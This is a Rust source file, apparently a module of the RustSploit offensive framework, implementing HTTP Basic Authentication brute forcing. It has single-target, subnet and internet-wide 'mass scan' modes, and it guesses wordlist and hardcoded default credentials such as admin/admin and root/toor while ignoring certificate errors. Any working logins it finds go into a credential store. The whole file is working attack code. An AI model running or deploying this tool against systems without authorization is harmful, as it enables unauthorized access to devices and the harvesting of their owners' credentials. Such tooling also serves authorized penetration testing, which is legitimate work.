use anyhow::{anyhow, Result};
use colored::*;
use std::io::Write;
use std::net::IpAddr;
use std::sync::Arc;
use std::time::Duration;

use crate::utils::{
    load_lines, get_filename_in_current_dir, normalize_target,
    cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range,
    cfg_prompt_output_file,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos_mode, parse_combo_mode, load_credential_file,
    run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_HTTP_PORT: u16 = 80;
const DEFAULT_HTTPS_PORT: u16 = 443;

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", ""),
    ("root", "root"),
    ("root", "password"),
    ("root", "toor"),
    ("root", ""),
    ("user", "user"),
    ("user", "password"),
    ("test", "test"),
    ("guest", "guest"),
    ("manager", "manager"),
];

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "HTTP Basic Auth Brute Force".to_string(),
        description: "Brute-force HTTP Basic Authentication using username/password wordlists. \
            Supports HTTPS with invalid certificate acceptance, default credential testing, \
            combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Error Classification
// ============================================================================

#[derive(Debug, Clone, PartialEq)]
enum HttpErrorType {
    AuthenticationFailed,
    ConnectionRefused,
    ConnectionTimeout,
    TlsError,
    Unknown,
}

impl HttpErrorType {
    fn classify_error(msg: &str) -> Self {
        let lower = msg.to_lowercase();
        if lower.contains("401") || lower.contains("403") || lower.contains("unauthorized") {
            Self::AuthenticationFailed
        } else if lower.contains("refused")
            || lower.contains("reset")
            || lower.contains("broken pipe")
        {
            Self::ConnectionRefused
        } else if lower.contains("timeout")
            || lower.contains("timed out")
            || lower.contains("deadline")
        {
            Self::ConnectionTimeout
        } else if lower.contains("tls")
            || lower.contains("ssl")
            || lower.contains("certificate")
            || lower.contains("handshake")
        {
            Self::TlsError
        } else {
            Self::Unknown
        }
    }

    fn is_retryable(&self) -> bool {
        matches!(self, Self::ConnectionRefused | Self::ConnectionTimeout | Self::Unknown)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::AuthenticationFailed => "Authentication failed",
            Self::ConnectionRefused => "Connection refused/reset",
            Self::ConnectionTimeout => "Connection timed out",
            Self::TlsError => "TLS/SSL error",
            Self::Unknown => "Unknown error",
        }
    }
}

#[derive(Debug)]
struct HttpError {
    error_type: HttpErrorType,
    message: String,
}

impl std::fmt::Display for HttpError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "[{}] {}", self.error_type.description(), self.message)
    }
}

impl std::error::Error for HttpError {}

impl HttpError {
    fn from_string(msg: String) -> Self {
        let error_type = HttpErrorType::classify_error(&msg);
        Self { error_type, message: msg }
    }
}

// ============================================================================
// Module Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("\n{}", "=== HTTP Basic Auth Bruteforce Module (RustSploit) ===".bold().cyan());
    crate::mprintln!();

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let use_https = cfg_prompt_yes_no("use_https", "Use HTTPS?", false).await?;
        let url_path = cfg_prompt_default("url_path", "URL path to test", "/").await?;

        return run_mass_scan(target, MassScanConfig {
            protocol_name: "HTTP-Basic",
            default_port: if use_https { DEFAULT_HTTPS_PORT } else { DEFAULT_HTTP_PORT },
            state_file: "http_basic_hose_state.log",
            default_output: "http_basic_mass_results.txt",
            default_concurrency: 200,
        }, move |ip: IpAddr, port: u16| {
            let url_path = url_path.clone();
            async move {
                // Quick TCP check
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
                    return None;
                }

                let scheme = if use_https { "https" } else { "http" };
                let base_url = format!("{}://{}:{}{}", scheme, ip, port, url_path);

                // First check if endpoint requires Basic auth (401 response)
                let client = match reqwest::Client::builder()
                    .danger_accept_invalid_certs(true)
                    .timeout(Duration::from_secs(5))
                    .build()
                {
                    Ok(c) => c,
                    Err(_) => return None,
                };

                match client.get(&base_url).send().await {
                    Ok(resp) if resp.status().as_u16() == 401 => {
                        // Basic auth required, try defaults
                    }
                    _ => return None, // No auth required or unreachable
                }

                let creds: &[(&str, &str)] = &[
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("root", "root"),
                    ("admin", "1234"),
                    ("admin", ""),
                    ("root", ""),
                ];
                for (user, pass) in creds {
                    match client
                        .get(&base_url)
                        .basic_auth(user, Some(pass))
                        .send()
                        .await
                    {
                        Ok(resp) if resp.status().as_u16() == 200 => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            {
                                let id = crate::cred_store::store_credential(
                                    &ip.to_string(),
                                    port,
                                    "http-basic",
                                    user,
                                    pass,
                                    crate::cred_store::CredType::Password,
                                    "creds/generic/http_basic_bruteforce",
                                ).await;
                                if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                            }
                            return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
                        }
                        _ => continue,
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let use_https = cfg_prompt_yes_no("use_https", "Use HTTPS?", false).await?;
        let default_port = if use_https { DEFAULT_HTTPS_PORT } else { DEFAULT_HTTP_PORT };
        let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
        let url_path = cfg_prompt_default("url_path", "URL path to test", "/").await?;

        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000).await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "http_basic_subnet_results.txt").await?;

        let subnet_client = Arc::new(reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::none())
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?);

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "http-basic",
            jitter_ms: 0,
            source_module: "creds/generic/http_basic_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let url_path = url_path.clone();
            let client = Arc::clone(&subnet_client);
            async move {
                let scheme = if use_https { "https" } else { "http" };
                let url = format!("{}://{}:{}{}", scheme, ip, port, url_path);
                match try_http_login(&client, &url, &user, &pass).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => {
                        let he = HttpError::from_string(e.to_string());
                        LoginResult::Error {
                            message: he.message,
                            retryable: he.error_type.is_retryable(),
                        }
                    }
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    let use_https = cfg_prompt_yes_no("use_https", "Use HTTPS?", false).await?;
    let default_port = if use_https { DEFAULT_HTTPS_PORT } else { DEFAULT_HTTP_PORT };
    let port = cfg_prompt_int_range("port", "Port", default_port as i64, 1, 65535).await? as u16;
    let url_path = cfg_prompt_default("url_path", "URL path to test", "/").await?;

    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
    } else {
        None
    };

    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent tasks", 10, 1, 256).await? as usize;
    let connection_timeout = cfg_prompt_int_range("timeout", "Connection timeout (seconds)", 5, 1, 60).await? as u64;
    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries = if retry_on_error {
        cfg_prompt_int_range("max_retries", "Max retries per attempt", 2, 1, 10).await? as usize
    } else {
        0
    };
    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "http_basic_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let scheme = if use_https { "https" } else { "http" };
    let base_url = format!("{}://{}:{}{}", scheme, target, port, url_path);
    let connect_addr = normalize_target(&format!("{}:{}", target, port))
        .unwrap_or_else(|_| format!("{}:{}", target, port));

    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {} ({})", connect_addr, base_url).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    let shared_client = Arc::new(reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .timeout(Duration::from_secs(connection_timeout))
        .build()
        .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?);

    let try_login = move |_t: String, _p: u16, user: String, pass: String| {
        let url = base_url.clone();
        let client = Arc::clone(&shared_client);
        async move {
            match try_http_login(&client, &url, &user, &pass).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => {
                    let he = HttpError::from_string(e.to_string());
                    LoginResult::Error {
                        message: he.message,
                        retryable: he.error_type.is_retryable(),
                    }
                }
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries,
        service_name: "http-basic",
        jitter_ms: 0,
        source_module: "creds/generic/http_basic_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored HTTP responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
            let default_name = "http_basic_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# HTTP Basic Auth Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// HTTP Basic Auth Login Attempt
// ============================================================================

/// Attempt HTTP Basic Auth login.
/// Returns Ok(true) on 200 (success), Ok(false) on 401/403 (auth failed),
/// Err on connection/protocol errors.
async fn try_http_login(
    client: &reqwest::Client,
    url: &str,
    user: &str,
    pass: &str,
) -> Result<bool> {
    let response = client
        .get(url)
        .basic_auth(user, Some(pass))
        .send()
        .await
        .map_err(|e| anyhow!("HTTP request failed: {}", e))?;

    let status = response.status().as_u16();
    match status {
        200..=299 => Ok(true),
        401 | 403 => Ok(false),
        301 | 302 | 303 | 307 | 308 => {
            // Only count redirect as success if it doesn't point to a login/auth page
            if let Some(location) = response.headers().get("location") {
                let loc = location.to_str().unwrap_or("").to_lowercase();
                if loc.contains("login") || loc.contains("auth") || loc.contains("signin") || loc.contains("sso") {
                    Ok(false) // Redirect to login page = auth failed
                } else {
                    Ok(true) // Redirect to non-login page = likely success
                }
            } else {
                Ok(true) // No location header = treat as success
            }
        }
        _ => Err(anyhow!("HTTP {}", status)),
    }
}
